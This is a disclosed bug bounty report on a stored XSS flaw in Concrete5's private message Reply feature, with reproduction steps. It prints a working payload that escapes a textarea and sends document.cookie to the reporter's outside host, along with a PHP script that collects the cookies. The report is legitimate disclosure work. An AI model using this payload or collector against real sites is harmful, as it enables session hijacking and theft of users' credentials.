# Stored XSS in Private Messages 'Reply' allows to execute malicious JavaScript against any user while replying to the message which contains payload

## Report Details
- **Report ID**: 247517
- **URL**: https://hackerone.com/reports/247517
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-07-09T21:57:07.812Z
- **Disclosed**: 2017-08-17T22:12:55.495Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: concretecms

## Vulnerability Information
## Intro

"Back to the Crayons"

__Type of issue__: Core CMS issue
__Level of severity__: External Attack Vector
__Concrete5 version__: 8.2.0 RC2 rev. 32c9daf352645d4fafedb7b956e7f2de4e153ab3 (July 8th)

## Summary

There is __Stored XSS__ vulnerability in Private Messages 'Reply' feature, when original message is quoted in reply content (this is by default). This issue can be used against any user, who accepted receiving private messages and replies to the message contains malicious payload.

To exploit this vulnerability an attacker has to trick other user to reply to his message.

## Steps to reproduce

- log in to concrete5 instance as any user
- go to ```index.php/account/messages```. Change url to ```index.php/account/messages/write/1``` which is equivalent to sending PM to __admin__ (changing user id in url to any other value allows to send message to selected user)
- set message title, then as a content of message put (at the end): closing ```</textarea>``` tag followed by any valid JavaScript code inside ```<script>``` tag. 

{F201511}

I used following payload in my attack:

```html
</textarea>
<script>
    var i = document.createElement('img')
    i.src = 'https://bl4de.000webhostapp.com/?c=' + document.cookie;
    document.body.append(i);
</script>
```

It creates and appends ```img``` element with url which points to my server on 000web hosting and allows to send cookie(s) to my PHP script:

```php
Hello :)
<?php
if (isset($_GET['c'])) {
	file_put_contents("cookies.txt", $_GET['c']);
}
```


- send message



To verify that vulnerability exists, log in as __admin__ (or any user you've sent message to) and go to Private Messages Inbox:

{F201512}

- open message

The content is properly sanitized (no JavaScript executed):


{F201514}



Now the fun part begins.

Select __Reply__ from the dropdown with message menu. As you can see, content of the original message is embeded below ```------- Original Message -------``` separator, however - is __not sanitized__, causes JavaScript script is executed __in context of logged admin__ (my sample attack scenario tries to steal cookie to hijack admin session and failed due to ```Http Only``` flag set, but it does not change the fact that Stored XSS attack works):

{F201513}

When we inspect HTML source, we can verify that closing ```</textarea>``` tag from payload allows to "escape" from message textarea and append and run JavaScript:

```html
<div class="form-group">
				<label for="body" class="control-label">Message</label>				<textarea id="msgBody" name="msgBody" rows="8" class="span5 form-control">


-------------------- Original Message --------------------
From: kotek
Date Sent: Jul 9, 2017, 9:55 PM
Subject: Problem with page!!!

Hi, could you please take a look at this and reply? Thanks!

</textarea>
<script>
        var i = document.createElement('img')
        i.src = 'https://bl4de.000webhostapp.com/?c=' + document.cookie;
        document.body.append(i);
    </script></textarea>			</div>

			<div class="ccm-dashboard-form-actions-wrapper">
			    <div class="ccm-dashboard-form-actions">
```


In presented PoC, one cookie was sent and saved on my 000web application:

{F201515}


## Impact

Any user is able to send PM to other user(s) with malicious payload trying to trick them to reply to his message. This scenario is described as __External Attack Vector__ in Concrete5 program policy.


## Testing environment

System:

- Concrete5 version 8.2.0 RC2, commit 32c9daf352645d4fafedb7b956e7f2de4e153ab3 from July  8th, installed localy
- PHP ver. 5.6.30
- Apache HTTP Server 2.4.25 for macOS
- MySQL ver. 5.7.13 for macOS

This vulnerability was tested on macOS Sierra 10.12.5 with following browsers:

- Chrome 59.0.3071.115
- Chromium build 61.0.3131.0
- Opera 46.0.2597.32


## Wrap up

I hope my report will help keep Concrete5 safe in the future.

Best Regards,

Rafal 'bl4de' Janicki

## Attachments
- pm_stroedxss_1.png
- pm_stroedxss_2.png
- pm_stroedxss_4.png
- pm_stroedxss_3.png
- pm_stroedxss_5.png
